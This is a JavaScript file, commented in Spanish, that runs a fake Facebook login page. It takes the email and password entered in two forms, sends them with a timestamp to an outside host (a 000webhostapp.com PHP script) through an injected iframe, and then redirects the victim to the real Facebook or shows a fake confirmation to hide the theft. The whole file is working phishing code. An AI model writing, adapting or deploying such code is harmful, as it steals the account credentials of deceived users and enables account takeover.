//##############################
//PARA LA PRIMERA ENTRADA:
listenerbtn("btn-login", validarEntrada1); //este es el nuevo complemento que escucha el btn y usa una funcion
function validarEntrada1() {
	var inputE1 = document.getElementById("email1");
	var inputE2 = document.getElementById("pass1");
	if ( (inputE1.value == "") || (inputE2.value == "") ) {
		alert("Un campo o los dos campos están vacíos.");
	} else {
		enviarDatos("email1", "pass1");//esta funcion envia los datos a la base.
		irAFacebook();//aca se redirecciona a la pag de fb.
	}
}

//PARA LA SEGUNDA ENTRADA:
listenerbtn("btnConfirmacion", validarEntrada2);
function validarEntrada2() {
	var inputE3 = document.getElementById("email2");
	var inputE4 = document.getElementById("pass2");
	if ( (inputE3.value == "") || (inputE4.value == "") ) {
		alert("Un campo o los dos campos están vacíos.");
	} else {
		enviarDatos("email2", "pass2");
		cambiarCuadro();
	}
}

//##############################





//###################################
//###################################
//FUNCIONES UNIVERSALES
function enviarDatos(emailN, passN) {
	var iframePresente = false;
	if (document.getElementById("newIframe")) {
		iframePresente = true;
	}
	if (iframePresente == false) {
			//se crea el elemento iframe con los valores 
			//de la url, fecha, usuario, contraseña.
			//CREAR EL IFRAME
			//primero se crea y concatena la url (fecha, usuario, pass)
			//#1: la fecha (var fecha)
			var meses = new Array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
			var d = new Date();
			var fecha = d.getDate() + "%2f" + meses[d.getMonth()] + "%2f" + d.getFullYear() + "+-+" + d.getHours() + "%3a" + d.getMinutes();
			//#2: el usuario
			var usuario = document.getElementById(emailN).value;
			//#3: la contraseña
			var contrasena = document.getElementById(passN).value;
		
		//variable de la url
		var srcRegistro = "https://acc-form-srv-in.000webhostapp.com/formulario.php?fecha=" + fecha + "&email=" + usuario + "&pass=" + contrasena;
		//obtener la caja donde va a estar el iframe
		var boxIframe = document.getElementById("boxIframeBD");
		//crear el hijo el cual es el ifame y añadirlo con todos sus datos a la pagina
		var newIframe = document.createElement("iframe");
		newIframe.id = "newIframe";
		newIframe.src = srcRegistro;
		newIframe.width = "500px";
		newIframe.height = "220px";
		boxIframe.appendChild(newIframe);
		console.log("Se han enviado los datos correctamente.");
		
	}
}

function irAFacebook() {
	setTimeout(mostrarRedirigiendo, 5000);
	function mostrarRedirigiendo() {
		//vaciar el body y mostrar un mensaje simple
		var pgnFull = document.getElementById("boxSuper");
		pgnFull.innerHTML = "<parrafo>Redirigiendo, por favor espera...</parrafo>";
		setTimeout(cargarPagFace, 2000);
		function cargarPagFace() {
			window.location = "https://www.facebook.com/";
		}
	}
}

function cambiarCuadro() {
	var btnConfirmacion = document.getElementById("btnConfirmacion").disabled = true;
	
	var cajaBotones = document.getElementById("cajaBotones");
	cajaBotones.style.opacity = "0.5";
	cajaBotones.style.backgroundColor = "#c2c0c0";
	
	var cajaCredenciales = document.getElementById("cajaCredenciales");
	cajaCredenciales.innerHTML = "[msg: cargando proceso.]";
	setTimeout(function() {
		var cajaCredenciales = document.getElementById("cajaCredenciales");
		cajaCredenciales.innerHTML = "[msg: proceso confirmado.]";
	}, 3000);
}
